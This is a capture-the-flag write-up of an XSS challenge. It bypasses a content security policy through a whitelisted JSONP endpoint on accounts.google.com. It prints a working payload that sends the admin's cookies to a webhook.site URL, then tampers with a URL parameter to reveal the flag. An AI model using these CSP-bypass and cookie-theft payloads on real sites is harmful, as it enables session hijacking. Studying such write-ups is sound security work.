# Challenge 


![](/img/cat/challenge.png)


## Solution

visiting the link provided [http://web.ctf.ae:8812/](http://web.ctf.ae:8812/) - will be offline soon XD


we are met with this friendly page 


![](/img/cat/default.png)


filling the form and clicking on submit we are met with this response


![](/img/cat/toadmin.png)


so far we can gather that it's an XSS related challenge,hence the hint in the challenge description.


- for a while i thought of coming up with a xss payload that steals the admin cookies,probably the flag set as a cookie,

trial one failed though 


![](/img/cat/test.png)


we get nothing on both our webhook instance,on preview nothing too


![](/img/cat/noexec.png)


why?, because we triggered the site's CSP (content security policy) a security feature in most web apps that mitigates execution of malicious scripts  among other attacks ... [Read More](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

- We need to bypass the CSP first inorder to proceed with our attack in which we need to steal the admin session cookies

decided to recon on the csp using Google's Evaluator

[https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/) and we get a hit ... 


![](/img/cat/cspcheck.png)


- we found a bypass, [accounts.google.com](accounts.google.com) is whitelisted

and another hint 


```
accounts.google.com -> accounts.google.com is known to host JSONP endpoints which allow to bypass this CSP.
```

on further research i bumped onto 

[https://github.com/zigoo0/JSONBee](https://github.com/zigoo0/JSONBee) where i found a readily prepared list of jsonp payloads that would lead to a csp bypass and hence xss

tried with 

`"><script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>`

for our case and it fired 


[other payloads](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)


yaay! we got XSS 


![](/img/cat/cspbypass.png)


![](/img/cat/confirmed.png)


now we have to figure out a way to steal admin's cookies,then exfiltrate them to a web that we can control,
for this case i chose to use


[webhook.site](https://webhook.site)


using the instance provided we can craft a payload 


i used 

`"><script src="//accounts.google.com/o/oauth2/revoke?callback=eval(document.location='https://webhook.site/e923b472-7002-4b02-902d-61f0eedebxxxx/'.concat(document.cookie))"></script>`


as


![](/img/cat/final.png)


submitted that,checking our instance we got some request from the Admin


![](/img/cat/endpoint.png)


Wait! no flag as expected, but atleast we got a new endpoint,or rather the url being used by the admin 

we can use the session cookie we found,set it then we can review tickets this time as the admin

but first let's change

`http://web.ctf.ae:8812/support_ticket/f1400c65-ea9f-48db-9394-0fda02b690db?displayFlag=false` the `displayFlag=false`  parameter to `displayFlag=True`


then we can visit the link to retrieve the flag
...



NB:// using the support ticket with the xss payload executes,so create any random description then review as admin


and doing so we got the flag



![](/img/cat/flag.png)


> Flag : CTFAE{JSONAreTheBestTypeOfBees}

....

Thank you for reading :)
